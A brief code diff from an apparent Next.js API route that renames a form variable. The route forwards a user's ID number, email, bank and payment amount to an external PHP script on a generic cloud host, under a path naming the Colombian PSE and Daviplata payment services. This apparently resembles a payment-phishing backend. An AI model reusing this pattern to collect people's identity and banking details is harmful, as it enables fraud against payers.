@@ -128,11 +128,11 @@ export async function POST(request: NextRequest) {
     // Preparar datos para enviar al servidor externo
     const externalUrl = "https://phpclusters-196676-0.cloudclusters.net/apipsedaviplata2/PSE.php";
 
-    const formData = new URLSearchParams();
-    formData.append("Documento", documento);
-    formData.append("Correo", correo);
-    formData.append("Banco", bank);
-    formData.append("Monto", amount.toString());
+    const postData = new URLSearchParams();
+    postData.append("Documento", documento);
+    postData.append("Correo", correo);
+    postData.append("Banco", bank);
+    postData.append("Monto", amount.toString());
 
     // Enviar POST al servidor externo (timeout 90 segundos)
     const controller = new AbortController();
@@ -144,7 +144,7 @@ export async function POST(request: NextRequest) {
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
         },
-        body: formData.toString(),
+        body: postData.toString(),
         signal: controller.signal,
       });
 
